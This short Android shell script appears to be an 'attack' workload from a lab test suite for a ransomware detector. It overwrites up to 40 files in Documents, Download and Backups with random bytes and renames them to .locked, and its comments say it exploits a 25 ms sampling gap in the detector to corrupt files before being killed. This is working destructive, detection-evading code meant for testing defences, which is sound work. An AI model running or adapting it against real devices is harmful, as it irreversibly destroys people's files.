#!/system/bin/sh
# E3 (Extreme): Zero-delay burst targeting small Documents/Download files (~695 bytes) first.
# Exploits the 25ms /proc/<pid>/io sampling sleep in Monitor.kt to corrupt many files before SIGKILL lands.
DIR="$(cd "$(dirname "$0")" && pwd)"
WORKLOAD_NAME="E3_blitz"
WORKLOAD_LABEL="attack"
. "$DIR/lib.sh"

MAX_FILES="${MAX_FILES:-40}"

verify_lab_env
log_truth "start"

OLD_IFS="$IFS"
IFS='
'
for f in $(find "$TARGET_ROOT/Documents" "$TARGET_ROOT/Download" "$TARGET_ROOT/Backups" -type f ! -name "*.locked" 2>/dev/null | sort | head -n "$MAX_FILES"); do
    IFS="$OLD_IFS"
    [ ! -f "$f" ] && continue
    head -c 512 /dev/urandom > "$f"
    log_truth "overwrite" "$f"
    mv "$f" "${f}.locked"
    log_truth "rename" "$f" "${f}.locked"
done
IFS="$OLD_IFS"

log_truth "end"